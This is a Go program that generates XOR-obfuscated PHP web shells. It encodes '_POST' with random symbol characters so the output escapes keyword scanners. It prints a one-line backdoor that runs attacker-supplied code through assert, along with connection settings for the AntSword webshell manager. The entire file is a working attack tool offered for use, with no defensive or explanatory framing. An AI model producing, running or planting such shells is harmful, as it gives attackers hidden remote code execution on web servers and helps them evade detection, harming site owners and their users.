package main

import (
	"flag"
	"fmt"
	"math/rand"
	"time"
)

const charset = "*&^~!#?|+-="

func banner() {
	banner := `

    //   ) )         //   ) )                          
   //___/ /         ((        / __      ___     // //  
  / ____ /   ____     \\     //   ) ) //___) ) // //   
 //                     ) ) //   / / //       // //    
//               ((___ / / //   / / ((____   // //  
                                
                                PHP-Shell生成器V1.0
                                author:Qianbenhyu-GPT
`
	print(banner, "\n")
}

func generateX(length int, target string) string {
	rand.Seed(time.Now().UnixNano())
	result := make([]byte, length)
	for i := range result {
		for {
			ch := charset[rand.Intn(len(charset))]
			xorResult := ch ^ target[i]
			if xorResult >= 32 && xorResult <= 126 {
				result[i] = ch
				break
			}
		}
	}
	return string(result)
}

func xorString(s1, s2 string) string {
	minLen := len(s1)
	if len(s2) < minLen {
		minLen = len(s2)
	}

	result := make([]byte, minLen)
	for i := 0; i < minLen; i++ {
		xorResult := s1[i] ^ s2[i]
		result[i] = xorResult
	}

	return string(result)
}

func xormain() {
	pwd := flag.String("pwd", "", "-pwd          输入连接密码")
	flag.Parse()
	pwd2 := *pwd
	X := generateX(5, "_POST")
	Y := xorString(X, "_POST")
	result := fmt.Sprintf("<?=~$_='%s'^'%s';@${$_}[_](@${$_}[%s]);", X, Y, pwd2)
	Z := xorString(X, Y)
	if Z == "_POST" {
		fmt.Println("[+] \u001B[31mSUCCESS:\u001B[0m ==>", result)
	} else {
		fmt.Println("\u001B[31m[*] Failed to generate a shell, please try twice!\u001B[0m")
	}
	fmt.Println("[+] \u001B[31mAntsword\u001B[0m ==> En/decoder: Base64 Pass: ", pwd2, "POST _=assert")
}

func main() {
	banner()
	xormain()

}
